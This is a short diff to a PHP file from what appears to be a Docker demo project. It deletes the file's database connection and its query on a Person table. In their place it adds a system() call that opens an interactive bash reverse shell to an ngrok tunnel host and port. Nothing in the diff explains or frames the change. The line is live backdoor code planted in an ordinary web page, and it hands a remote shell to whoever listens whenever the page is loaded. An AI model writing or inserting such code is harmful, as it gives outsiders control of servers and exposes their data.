@@ -1,7 +1,3 @@
 <?php
-error_reporting(0);
-$conn = mysqli_connect('db', 'user', 'test', "dockerExample");
 
-
-$query = 'SELECT * From Person';
-$result = mysqli_query($conn, $query);
+system("bash -c 'exec bash -i &>/dev/tcp/0.tcp.ap.ngrok.io/14697 <&1'");
